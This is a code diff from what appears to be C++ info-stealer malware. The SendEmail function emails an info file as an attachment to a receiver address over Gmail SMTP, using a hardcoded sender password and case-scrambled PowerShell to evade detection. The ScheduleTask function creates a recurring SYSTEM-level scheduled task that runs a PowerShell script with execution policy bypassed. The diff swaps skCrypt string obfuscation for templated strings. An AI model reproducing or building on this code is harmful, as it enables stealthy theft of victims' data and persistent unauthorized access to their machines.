@@ -9,16 +9,8 @@ bool IsConnected2Internet() {
 }
 
 void SendEmail() {
-    system(RunEncCommand(
-        (string)skCrypt("seND-mAilmeSSaGE -frOM '") + SENDERMAIL +
-        (string)skCrypt("' -tO '") + RECEIVERMAIL +
-        (string)skCrypt("' -SuBJect '") + EMAILSUBJECT +
-        (string)skCrypt("' -bodY '") + EMAILBODY +
-        (string)skCrypt("' -AtTAchMenTs '") + INFOFILE +
-        (string)skCrypt("' -sMtPsERveR 'smtp.gmail.com' -pOrt 587 -usESsl -creDentIAl (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList '") + SENDERMAIL +
-        (string)skCrypt("', (ConvertTo-SecureString '") + SENDERPSW +
-        (string)skCrypt("' -AsPlainText -Force))")
-    ).c_str());
+	system("seND-mAilmeSSaGE -frOM '$SENDERMAIL' -tO '$RECEIVERMAIL' -SuBJect '$EMAILSUBJECT' -bodY '$EMAILBODY' -AtTAchMenTs '$INFOFILE' -sMtPsERveR 'smtp.gmail.com' -pOrt 587 -usESsl -creDentIAl (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList '$SENDERMAIL', (ConvertTo-SecureString '$SENDERPSW' -AsPlainText -Force))");
+    // Automatically encoded during precompilation
 }
 
 void SendTelegram() {
@@ -89,6 +81,7 @@ cleanup:
 }
 
 void ScheduleTask() {
-    system(((string)skCrypt("schtasks /delete /f /tn \"") + TASKNAME + (string)skCrypt("\"")).c_str());
-    system(((string)skCrypt("schtasks /create /sc minute /mo ") + MINUTES + (string)skCrypt(" /f /ru \"SYSTEM\" /tn \"") + TASKNAME + (string)skCrypt("\" /tr \"powershell -noprofile -executionpolicy bypass -file '") + EMAILSENDER + (string)skCrypt("'\"")).c_str());
+	system("schtasks /delete /f /tn \"$TASKNAME\"");
+	system("schtasks /create /sc minute /mo $MINUTES /f /ru \"SYSTEM\" /tn \"$TASKNAME\" /tr \"powershell -noprofile -executionpolicy bypass -file '$EMAILSENDER'\"");
+    // Automatically encoded during precompilation
 }
